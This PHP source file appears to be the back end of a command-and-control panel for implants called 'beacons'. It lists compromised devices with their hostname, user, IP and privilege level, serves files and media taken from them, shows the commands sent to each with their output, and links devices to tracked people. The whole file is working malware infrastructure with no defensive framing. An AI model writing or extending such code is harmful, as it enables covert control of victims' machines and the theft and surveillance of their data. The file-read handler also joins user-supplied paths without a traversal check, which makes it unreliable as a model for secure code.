<?php
declare(strict_types=1);

function handleRename(): void {
    requireMethod('POST');
    $input = jsonInput();
    $uuid = trim($input['uuid'] ?? '');
    if (empty($uuid)) jsonError('Missing uuid');
    DB::connect()->update('beacons', 'uuid', $uuid, ['nickname' => $input['nickname'] ?? '']);
    jsonOut(['status' => 'ok']);
}

function handleSaveNotes(): void {
    requireMethod('POST');
    $input = jsonInput();
    $uuid = trim($input['uuid'] ?? '');
    if (empty($uuid)) jsonError('Missing uuid');
    DB::connect()->update('beacons', 'uuid', $uuid, ['notes' => $input['text'] ?? '']);
    jsonOut(['status' => 'ok']);
}

function handleListBeacons(): void {
    $db = DB::connect();
    $beacons = $db->all('beacons');
    usort($beacons, fn($a, $b) => strcmp($b['last_seen'] ?? '', $a['last_seen'] ?? ''));
    $now = time();
    foreach ($beacons as &$b) {
        $ls = strtotime($b['last_seen'] ?? '0');
        if (($b['status'] ?? '') === 'active' && ($now - $ls) > 60) $b['status'] = 'dead';
    }
    jsonOut($beacons);
}

function handleLsDevice(): void {
    requireMethod('GET');
    $uuid = $_GET['beacon_uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing beacon_uuid');
    $db = DB::connect();
    $fl = $db->find('files', 'beacon_uuid', $uuid);
    $ml = $db->find('media', 'beacon_uuid', $uuid);
    $entries = [];
    if (count($fl)) {
        $entries[] = ['path'=>'files','name'=>'files','type'=>'dir','count'=>count($fl),'size'=>array_sum(array_column($fl,'size'))];
        foreach ($fl as $f) $entries[] = ['path'=>'files/'.$f['filename'],'name'=>$f['filename'],'type'=>'file','size'=>(int)$f['size'],'modified'=>$f['created_at']];
    }
    if (count($ml)) {
        $entries[] = ['path'=>'media','name'=>'media','type'=>'dir','count'=>count($ml),'size'=>0];
        foreach ($ml as $m) $entries[] = ['path'=>'media/'.$m['filename'],'name'=>$m['filename'],'type'=>'file','size'=>is_file($m['path'])?filesize($m['path']):0,'modified'=>$m['created_at']];
    }
    $be = $db->findOne('beacons', 'uuid', $uuid);
    if ($be && !empty($be['notes'])) $entries[] = ['path'=>'notes.txt','name'=>'notes.txt','type'=>'file','size'=>strlen($be['notes']),'modified'=>now()];
    jsonOut(['entries' => $entries]);
}

function handleDeviceRead(): void {
    requireMethod('GET');
    $uuid = $_GET['beacon_uuid'] ?? '';
    $path = $_GET['path'] ?? '';
    if (empty($uuid) || empty($path)) jsonError('Missing parameters');
    if ($path === 'notes.txt') {
        $b = DB::connect()->findOne('beacons', 'uuid', $uuid);
        if (!$b) jsonError('Not found', 404);
        header('Content-Type: text/plain; charset=utf-8');
        echo $b['notes'] ?? ''; exit;
    }
    $dd = deviceDir($uuid);
    foreach (['files/','media/'] as $prefix) {
        if (str_starts_with($path, $prefix)) {
            $name = substr($path, strlen($prefix));
            $fp = $dd . '/' . $prefix . $name;
            if (is_file($fp)) {
                $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                $types = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','webp'=>'image/webp','mp4'=>'video/mp4','webm'=>'video/webm','pdf'=>'application/pdf'];
                header('Content-Type: ' . ($types[$ext] ?? 'application/octet-stream'));
                readfile($fp); exit;
            }
        }
    }
    jsonError('Not found', 404);
}

function handleDeviceInfo(): void {
    requireMethod('GET');
    $uuid = $_GET['beacon_uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing beacon_uuid');
    $b = DB::connect()->findOne('beacons', 'uuid', $uuid);
    if (!$b) jsonError('Not found', 404);
    jsonOut(['hostname'=>$b['hostname'],'os'=>$b['os'],'os_family'=>$b['os_family']??detectOS($b['os']??''),'username'=>$b['username'],'ip'=>$b['ip'],'privilege'=>$b['privilege'],'pid'=>$b['pid'],'collected_at'=>$b['last_seen']]);
}

function handleTerminal(): void {
    requireMethod('GET');
    $uuid = $_GET['beacon_uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing beacon_uuid');
    $db = DB::connect();
    $results = $db->find('results', 'beacon_uuid', $uuid);
    $tasks = $db->all('tasks');
    $combined = [];
    foreach ($results as $r) {
        $task = null;
        foreach ($tasks as $t) { if (($t['id']??0) === ($r['task_id']??0)) { $task = $t; break; } }
        $combined[] = ['command'=>$task['command']??'','output'=>$r['output']??'','timestamp'=>$r['created_at']??''];
    }
    usort($combined, fn($a, $b) => strcmp($a['timestamp'] ?? '', $b['timestamp'] ?? ''));
    jsonOut(array_slice($combined, -100));
}

function handleRemoveDevice(): void {
    requireMethod('POST');
    $input = jsonInput();
    $uuid = $input['uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing uuid');
    $db = DB::connect();
    $db->delete('results', 'beacon_uuid', $uuid);
    $db->delete('files', 'beacon_uuid', $uuid);
    $db->delete('media', 'beacon_uuid', $uuid);
    $db->delete('browse_cache', 'beacon_uuid', $uuid);
    $db->delete('tasks', 'beacon_uuid', $uuid);
    foreach ($db->all('persons') as $p) {
        $devs = is_string($p['linked_devices'] ?? '') ? (json_decode($p['linked_devices'], true) ?? []) : ($p['linked_devices'] ?? []);
        $devs = array_values(array_filter($devs, fn($d) => $d !== $uuid));
        $db->update('persons', 'id', $p['id'], ['linked_devices' => json_encode($devs)]);
    }
    $db->delete('beacons', 'uuid', $uuid);
    $dd = deviceDir($uuid);
    if (is_dir($dd)) {
        $it = new RecursiveDirectoryIterator($dd, RecursiveDirectoryIterator::SKIP_DOTS);
        $fi = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($fi as $f) { $f->isDir() ? rmdir($f->getRealPath()) : unlink($f->getRealPath()); }
        rmdir($dd);
    }
    jsonOut(['status' => 'ok']);
}
